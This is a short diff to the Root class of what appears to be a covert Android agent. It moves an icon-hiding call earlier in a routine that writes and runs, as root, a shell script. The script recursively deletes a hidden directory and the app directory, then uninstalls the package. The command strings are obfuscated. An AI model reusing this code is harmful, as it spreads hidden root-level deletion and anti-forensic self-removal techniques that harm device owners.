@@ -229,6 +229,8 @@ public class Root {
 		String apkName = Status.getApkName();
 		Boolean isPersisten = Status.isPersistent();
 		if (apkName != null ) {
+
+			Status.setIconState(false);
 			String script = M.e("#!/system/bin/sh") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 			script += M.e("rm -r ") + Path.hidden() + "\n";
@@ -242,7 +244,7 @@ public class Root {
 					script += M.e("rm -r ") + Status.getAppDir() + "\n";
 				}
 			}
-			script += Configuration.shellFile + M.e(" ru")+"\n";
+			script += Configuration.shellFile + M.e(" ru") + "\n";
 			script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
 
 			if (Cfg.DEBUG) {
@@ -256,7 +258,6 @@ public class Root {
 				}
 				return false;
 			}
-			Status.setIconState(false);
 			Execute ex = new Execute();
 			ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
 			if (Cfg.DEBUG) {
